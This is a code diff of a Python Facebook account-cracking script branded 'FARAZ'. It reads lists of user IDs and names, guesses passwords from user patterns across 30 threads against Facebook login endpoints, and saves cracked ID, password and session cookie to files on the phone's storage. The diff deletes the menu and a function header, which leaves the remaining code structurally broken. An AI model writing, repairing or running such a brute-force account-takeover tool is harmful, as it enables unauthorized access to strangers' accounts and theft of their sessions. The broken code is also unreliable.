@@ -87,76 +87,6 @@ print("""\033[1;33m═━═━═━═━═━═━═━═━═━═━�
 def linex():
         print('\033[1;93m =========================================')
 def clear():
-        os.system(f'clear')
-        print(logo)
-loop=0
-oks=[]
-cps=[]
-pcp=[]
-id=[]
-tokenku=[]
-for char in logo:
-    print(char, end='', flush=True)
-    time.sleep(0.02)
-def Spy():
-	clear()
-	print(f" [1] FILE CRACK")
-	print(f" [0] EXIT")
-	me=input(f'\n [?] CHOOSE : ')
-	if me in ["1", "01","11","A","a"]:
-		clear()
-		file = input(f' [?] PUT FILE PATH\033[1;37m: ')
-		try:
-			fo = open(file,'r').read().splitlines()
-		except FileNotFoundError:
-			print(f' \033[1;31m[!] File location not found ')
-			exit()
-		os.system('clear')
-		print(logo)
-		print(f' [1] METHOD 1 \n [2] METHOD 2 \n [3] METHOD 3 \n [4] METHOD 4 \n [5] METHOD 5')
-		mthd=input(f'\n [?] CHOOSE : ')
-		plist=[]
-		try:
-			ps_limit = int(input(f'\n [?] HOW MANY PASSWORDS DO YOU AWANT TO ADD ? : '))
-		except:
-			ps_limit =1
-		os.system('clear')
-		print(logo)
-		print(f'\033[1;32m [+] EXAMPLE : first last,firtslast,first123\n')
-		for i in range(ps_limit):
-			plist.append(input(f' [?] PUT YOUR PASSLIST {i+1}: '))
-	 
-		cx=input(f'\n [?] DO YOU WENT SHOW CP ACCOUNT? (Y/N): ')
-		if cx in ['n','N','no','NO','2']:
-			pcp.append(f'n')
-		else:
-			pcp.append(f'y')
-		with tred(max_workers=30) as crack_submit:
-			clear()
-			total_ids = str(len(fo))
-			print(f' TOTAL ACCOUNT IDS  : \033[1;32m'+total_ids+f' \n \033[1;37mMETHOD : \033[1;37mM{mthd}')
-			print(f"\033[1;36m /storage/emulated/0/FARAZ-OK.txt\033[1;37m")
-			print(f"\033[1;36m /storage/emulated/0/FARAZ-CP.txt\033[1;37m")
-			print(f"\033[1;37m USE FLIGHT MODE FOR SPEED UP\033[1;37m")
-			linex()
-			for user in fo:
-				ids,names = user.split(f'|')
-				passlist = plist
-				if mthd in ['1','01']:
-					crack_submit.submit(ffb,ids,names,passlist)
-				elif mthd in ['2','02']:
-					crack_submit.submit(api,ids,names,passlist)
-				elif mthd in ['3','03']:
-					crack_submit.submit(ffb1,ids,names,passlist)
-				elif mthd in ['4','04']:
-					crack_submit.submit(api1,ids,names,passlist)
-				else:
-					crack_submit.submit(api1,ids,names,passlist)
-def ffb(ids, names, passlist):
-    for password in passlist:
-        print(f"Trying {password} for {ids} ({names})")
-        global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [FARAZ-KING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -174,10 +104,15 @@ def ffb(ids, names, passlist):
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post(f'https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         FARAZ=session.cookies.get_dict().keys()
+
+                        # 🔥 yahan fix kiya gaya (overwrite instead of new line)
+                        sys.stdout.write(f"\r[FARAZ-KING]{str(len(oks))}|OK:-O Trying {pas} for {ids} ({names})")
+                        sys.stdout.flush()
+
                         if "c_user" in FARAZ:
                                 coki=session.cookies.get_dict()
-                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [FARAZ-OK] %s | %s'%(ids,pas))
+                                cookie = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+                                print(f'\n\r\033[1;32m [FARAZ-OK] %s | %s'%(ids,pas))
                                 print(f'\033[1;33m [COOKIE-🍪] :\033[1;33m '+cookie)
                                 open(f'/sdcard/FARAZ-OK.txt', 'a').write(ids+'|'+pas+'|'+cookie+'\n')
                                 #cek_apk(session,coki)
@@ -185,7 +120,7 @@ def ffb(ids, names, passlist):
                                 break
                         elif 'checkpoint' in FARAZ:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [FARAZ-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        print(f'\n\r\x1b[38;5;126m [FARAZ-CP] '+ids+' | '+pas+'\033[1;97m')
                                         open(f'/sdcard/FARAZ-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
